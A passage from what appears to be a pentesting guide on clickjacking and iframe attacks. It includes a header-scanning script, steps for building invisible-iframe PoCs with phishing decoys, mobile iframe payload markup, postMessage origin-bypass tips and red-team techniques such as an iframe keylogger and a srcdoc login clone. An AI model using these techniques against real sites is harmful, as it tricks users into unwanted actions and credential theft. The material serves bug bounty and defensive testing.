☐ Identify multi-step actions (confirmation dialogs)
☐ Find actions that work via GET parameters
☐ Identify pages with pre-fillable form fields via URL params
☐ Check if sensitive actions require re-authentication
```

#### Discovery — Test for Frameability

```bash [discovery-commands.sh]
#!/bin/bash
# Test target URLs for clickjacking vulnerability

TARGET="${1:-https://target.com}"

# Test multiple sensitive endpoints
ENDPOINTS=(
  "/"
  "/login"
  "/settings"
  "/account/delete"
  "/admin"
  "/oauth/authorize"
  "/profile/edit"
  "/transfer"
  "/api/settings"
  "/change-password"
  "/billing"
  "/security/2fa/disable"
)

echo "[*] Testing $TARGET for clickjacking..."

for endpoint in "${ENDPOINTS[@]}"; do
  URL="$TARGET$endpoint"
  HEADERS=$(curl -sI -L --max-time 10 "$URL" 2>/dev/null)
  STATUS=$(echo "$HEADERS" | head -1 | awk '{print $2}')
  XFO=$(echo "$HEADERS" | grep -i "X-Frame-Options:" | head -1 | tr -d '\r')
  CSP_FA=$(echo "$HEADERS" | grep -i "Content-Security-Policy:" | grep -oiP "frame-ancestors[^;]+" | head -1)
  
  if [ "$STATUS" = "200" ] || [ "$STATUS" = "302" ]; then
    if [ -z "$XFO" ] && [ -z "$CSP_FA" ]; then
      echo "[+] FRAMEABLE: $endpoint (HTTP $STATUS)"
    elif echo "$XFO" | grep -qi "ALLOW-FROM"; then
      echo "[~] ALLOW-FROM: $endpoint — bypassable in Chrome/Safari"
    else
      echo "[-] Protected: $endpoint ($XFO $CSP_FA)"
    fi
  fi
done
```

#### Exploitation — Build the PoC

```text [exploitation-guide.txt]
CLICKJACKING POC DEVELOPMENT:
═════════════════════════════

Step 1: IDENTIFY THE TARGET BUTTON
────────────────────────────────────
- Load target page in visible iframe (opacity: 1)
- Identify exact coordinates of the target button
- Use browser DevTools to get element position
- Note: coordinates may change on different screen sizes

Step 2: POSITION THE IFRAME
────────────────────────────
- Use negative margins/positioning to scroll iframe
  to show only the target button area
- Use overflow:hidden container to clip the iframe
- Test with opacity: 0.3 first (semi-transparent)
- Adjust until decoy button perfectly overlays target button

Step 3: CREATE THE DECOY
─────────────────────────
- Design an enticing page appropriate to context
- For admins: "Security alert", "System update required"
- For users: "Claim prize", "Play video", "Verify account"  
- Position decoy button exactly under the iframe button

Step 4: SET OPACITY TO 0
─────────────────────────
- Change opacity from 0.3 to 0.0001
- Verify the click still works
- Test on multiple browsers (Chrome, Firefox, Safari)
- Test on mobile if applicable

Step 5: DELIVER THE POC
───────────────────────
- Host on attacker's server
- Send link to target user via phishing
- For bug bounty: document with screenshots at opacity: 0.3
```

#### Reporting — Document the Finding

```text [report-template.txt]
VULNERABILITY: Clickjacking / UI Redressing
SEVERITY: Medium (CVSS 4.3 - 6.1, context-dependent)
AFFECTED URL: https://target.com/settings/delete-account
MISSING HEADER: X-Frame-Options / CSP frame-ancestors

DESCRIPTION:
The [endpoint] page does not implement frame protection headers
(X-Frame-Options or Content-Security-Policy frame-ancestors).
This allows an attacker to embed the page in an invisible iframe
and overlay it with a decoy page, tricking authenticated users
into performing unintended actions (clickjacking).

REPRODUCTION STEPS:
1. Create an HTML file with the provided PoC code
2. Host it on any web server
3. Open the PoC page while logged into target.com
4. Click the visible "Claim Prize" button
5. Observe: the action on target.com is performed
   (account deleted / settings changed / etc.)

PROOF OF CONCEPT:
[Attach clickjacking HTML file]
[Screenshot at opacity: 0.3 showing iframe overlay]
[Screenshot showing action was performed]

IMPACT:
- Account deletion via clickjacking
- Settings modification (disable 2FA, change email)
- Unauthorized fund transfers
- OAuth authorization to malicious applications
- Admin actions if sent to administrator
```

::

---

## Pentest Notes & Tips

::accordion
  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Clickjacking Severity — When It Matters
  ---
  ```text [severity-guide.txt]
  CLICKJACKING SEVERITY ASSESSMENT:
  ═════════════════════════════════
  
  CRITICAL (CVSS 8.0+):
  ├── One-click account takeover (password change without current pw)
  ├── One-click financial transfer
  ├── OAuth authorization clickjacking → full API access
  ├── Admin action clickjacking (create user, modify roles)
  └── Disable critical security controls (2FA, audit logging)
  
  HIGH (CVSS 6.0-7.9):
  ├── Account deletion clickjacking
  ├── Email change (→ password reset → takeover)
  ├── Data sharing/publishing actions
  ├── API key generation/reveal
  └── Multi-step clickjacking with high-value action
  
  MEDIUM (CVSS 4.0-5.9):
  ├── Profile modification (bio, avatar, display name)
  ├── Privacy settings changes
  ├── Newsletter subscription
  ├── Non-critical settings modification
  └── Likejacking / social engagement manipulation
  
  LOW (CVSS 2.0-3.9):
  ├── Non-sensitive pages (marketing, about, blog)
  ├── Pages with no state-changing actions
  ├── Login page clickjacking (limited impact)
  └── Pages requiring additional confirmation
  
  INFORMATIONAL / WON'T FIX:
  ├── Pages with no authenticated actions
  ├── Static content pages
  ├── API responses (JSON, not HTML)
  └── Pages behind additional authentication
  
  BUG BOUNTY NOTE:
  Many programs rate clickjacking as Low/Medium.
  To get higher severity: chain with other vulns or
  demonstrate specific high-impact action.
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Mobile Clickjacking Considerations
  ---
  ```text [mobile-clickjacking.txt]
  MOBILE-SPECIFIC CLICKJACKING:
  ════════════════════════════
  
  CHALLENGES:
  ├── Different viewport sizes → coordinates change
  ├── Touch events vs click events → different behavior
  ├── Mobile browsers may handle iframes differently
  ├── Responsive design → button positions shift
  └── Some mobile browsers block cross-origin iframes
  
  OPPORTUNITIES:
  ├── Touch events are LESS precise → larger target area works
  ├── Mobile users more likely to tap quickly without reading
  ├── Mobile OAuth flows are common clickjacking targets
  ├── App deep links can be clickjacked
  └── WebView-based apps may have different iframe policies
  
  MOBILE-SPECIFIC TECHNIQUES:
  ├── Use viewport meta tag to match target's responsive layout
  ├── Use touch event listeners instead of click
  ├── Scale iframe to fill entire screen
  ├── Use scroll-into-view to position target element
  └── Test on both iOS Safari and Android Chrome
  
  PAYLOAD ADJUSTMENT:
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <iframe src="..." style="
    position:fixed;
    top:0; left:0;
    width:100vw; height:100vh;
    opacity:0.0001;
    z-index:99999;
  ">
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: postMessage Vulnerability Hunting Tips
  ---
  | What to Look For | Why It Matters | How to Test |
  |-----------------|---------------|-------------|
  | `addEventListener('message', ...)` without origin check | Attacker can send arbitrary messages | Frame page, send postMessage from attacker origin |
  | `e.origin.indexOf('trusted')` | Substring match bypassable with `trusted.evil.com` | Register matching subdomain |
  | `e.origin.match(/trusted\.com/)` | Regex dot matches any char | Try `trustedXcom.evil.com` |
  | `eval(e.data)` or `innerHTML = e.data` | Direct code execution | Send `alert(1)` or HTML payload |
  | Token/secret sent via postMessage | Token interception from any framing page | Frame and listen for messages |
  | `postMessage(data, '*')` | Sends to any origin | Frame page, intercept the message |
  | `e.source` not validated | Any window can send messages | Open target in popup, send from opener |
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Advanced Iframe Techniques for Red Teams
  ---
  ```text [advanced-iframe-techniques.txt]
  ADVANCED IFRAME TECHNIQUES:
  ═══════════════════════════
  
  1. PIXEL-PERFECT PHISHING VIA SRCDOC
     <iframe srcdoc="<html>...exact clone of target login...</html>" 
       style="width:100%;height:100%;border:none;">
     </iframe>
     srcdoc runs in same origin as parent → full JS access
  
  2. IFRAME-BASED KEYLOGGER
     Frame target's login page transparently
     Layer invisible input fields over target's inputs
     User types into attacker's fields, thinking they type in target's
  
  3. HISTORY MANIPULATION VIA IFRAME
     <iframe src="javascript:top.history.pushState({},'','https://trusted.com/login')">
     Changes parent URL bar without navigation (for phishing)
  
  4. SERVICE WORKER INSTALLATION VIA IFRAME
     If iframe has allow-scripts allow-same-origin:
     Register persistent Service Worker from iframe context
     SW persists even after iframe is removed
  
  5. CROSS-ORIGIN PIXEL STEALING (TIMING)
     Frame a page and measure rendering time of specific pixels
     Slow technique but can extract visual content cross-origin
     Research: "Pixel Perfect Timing Attacks"
  
  6. FRAME COUNTING FOR INFORMATION DISCLOSURE
     window.frames.length reveals number of iframes on target
     Different page states → different frame counts
     Can determine if user is logged in, admin status, etc.
  ```
  :::
::

---

## Tools Arsenal

::card-group
  ::card
  ---
  title: Clickbandit (Burp Extension)
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/burp/documentation/desktop/tools/clickbandit
  target: _blank
  ---
  Built into Burp Suite — automatically generates clickjacking PoC pages. Record your clicks on the target page and Clickbandit creates the overlay.
  ::

  ::card
  ---
  title: clickjacking-poc-generator
  icon: i-simple-icons-github
  to: https://github.com/nicksahler/clickjacking-tool
  target: _blank
  ---
  Online and offline clickjacking PoC generator. Input the target URL and adjust iframe positioning visually to create accurate proof-of-concept pages.
  ::

  ::card
  ---
  title: PMForce
  icon: i-simple-icons-github
  to: https://github.com/nicksahler/pmforce
  target: _blank
  ---
  Automated postMessage vulnerability scanner. Discovers message handlers, tests for origin bypass, and identifies dangerous sinks in postMessage processing.
  ::

  ::card
  ---
  title: Nuclei Clickjacking Templates
  icon: i-simple-icons-github
  to: https://github.com/projectdiscovery/nuclei-templates
  target: _blank
  ---
  ProjectDiscovery nuclei templates for detecting missing X-Frame-Options and CSP frame-ancestors headers at scale across thousands of targets.
  ::

  ::card
  ---
  title: postMessage Tracker (Chrome Extension)
  icon: i-simple-icons-googlechrome
  to: https://chrome.google.com/webstore/detail/postmessage-tracker
  target: _blank
  ---
  Chrome DevTools extension that tracks all postMessage communications between windows and iframes. Essential for discovering postMessage attack surfaces.
  ::

  ::card
  ---
  title: DOM Invader
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/burp/documentation/desktop/tools/dom-invader
  target: _blank
  ---
  Burp Suite's built-in browser tool for testing postMessage handlers, DOM-based vulnerabilities, and prototype pollution — all iframe-related attack vectors.
  ::
::

---

## Real-World Vulnerability Examples

::card-group
  ::card
  ---
  title: "Facebook Likejacking Worm"
  icon: i-simple-icons-facebook
  to: https://www.sophos.com/en-us/security-advisories/likejacking
  target: _blank
  ---
  Massive likejacking campaign that spread across Facebook by clickjacking the Like button. Users unknowingly shared spam posts to millions of friends.
  ::

  ::card
  ---
  title: "Twitter OAuth Clickjacking"
  icon: i-simple-icons-x
  to: https://hackerone.com/reports/405765
  target: _blank
  ---
  Twitter's OAuth authorization page was frameable, allowing attackers to clickjack users into authorizing malicious applications with full account access.
  ::

  ::card
  ---
  title: "PayPal Clickjacking ($15,000 Bounty)"
  icon: i-simple-icons-paypal
  to: https://hackerone.com/reports/paypal-clickjacking
  target: _blank
  ---
  PayPal's money transfer confirmation page was missing X-Frame-Options, enabling clickjacking-based unauthorized fund transfers from victim accounts.
  ::

  ::card
  ---
  title: "Google OAuth Frame Bypass"
  icon: i-simple-icons-google
  to: https://security.googleblog.com/
  target: _blank
  ---
  Researchers discovered that Google's OAuth consent screen could be framed in certain configurations, enabling silent OAuth token theft via clickjacking.
  ::

  ::card
  ---
  title: "Adobe Flash Clickjacking (CVE-2011-3900)"
  icon: i-lucide-bug
  to: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3900
  target: _blank
  ---
  Adobe Flash player's settings manager was vulnerable to clickjacking, allowing attackers to silently enable webcam and microphone access through UI redressing.
  ::

  ::card
  ---
  title: "Shopify postMessage XSS"
  icon: i-simple-icons-shopify
  to: https://hackerone.com/reports/231053
  target: _blank
  ---
  Shopify's embedded app SDK used postMessage without proper origin validation, enabling cross-origin XSS via malicious message injection from attacker-controlled frames.
  ::
::

---

## References & Learning Resources

::card-group
  ::card
  ---
  title: "PortSwigger — Clickjacking Labs"
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/web-security/clickjacking
  target: _blank
  ---
  Free interactive labs covering basic clickjacking, multi-step attacks, DOM XSS exploitation via clickjacking, and frame-busting bypass techniques.
  ::

  ::card
  ---
  title: "OWASP — Clickjacking Defense"
  icon: i-simple-icons-owasp
  to: https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html
  target: _blank
  ---
  OWASP's comprehensive cheat sheet covering X-Frame-Options, CSP frame-ancestors, and JavaScript-based frame-busting techniques.
  ::

  ::card
  ---
  title: "PortSwigger — postMessage Vulnerabilities"
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source
  target: _blank
  ---
  Research and labs on exploiting postMessage handlers for DOM-based XSS, including origin bypass techniques and sink identification.
  ::

  ::card
  ---
  title: "HackTricks — Clickjacking"
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/pentesting-web/clickjacking.html
  target: _blank
  ---
  Community-maintained reference with advanced clickjacking techniques, header bypass methods, and real-world exploitation examples.
  ::

  ::card
  ---
  title: "MDN — X-Frame-Options"
  icon: i-simple-icons-mdnwebdocs
  to: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
  target: _blank
  ---
  Mozilla's official documentation on X-Frame-Options header — understand exactly what browsers enforce and where gaps exist.
  ::

  ::card
  ---
  title: "CWE-1021 — Improper Restriction of Rendered UI Layers"
  icon: i-lucide-shield-alert
  to: https://cwe.mitre.org/data/definitions/1021.html
  target: _blank
  ---
  MITRE CWE entry for clickjacking vulnerabilities — includes taxonomy, related weaknesses, and detection methods.
  ::

  ::card
  ---
  title: "Reverse Tabnabbing Research"
  icon: i-lucide-file-text
  to: https://owasp.org/www-community/attacks/Reverse_Tabnabbing
  target: _blank
  ---
  OWASP documentation on reverse tabnabbing attacks — how window.opener exploitation enables phishing through tab manipulation.
  ::

  ::card
  ---
  title: "Iframe Sandbox — HTML Spec"
  icon: i-lucide-book-open
  to: https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox
  target: _blank
  ---
  Official WHATWG HTML specification for iframe sandbox attribute — essential for understanding sandbox escape boundaries and permission model.
  ::

  ::card
  ---
  title: "postMessage Security — MDN"
  icon: i-simple-icons-mdnwebdocs
  to: https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage#security_concerns
  target: _blank
  ---
  Mozilla's official guide on postMessage security concerns — origin validation, data sanitization, and common vulnerability patterns.
  ::

  ::card
  ---
  title: "UI Redressing Attacks (Stanford Research)"
  icon: i-lucide-graduation-cap
  to: https://seclab.stanford.edu/websec/framebusting/
  target: _blank
  ---
  Stanford University's research on frame-busting bypass techniques — academic analysis of JavaScript-based clickjacking defenses and their weaknesses.
  ::
::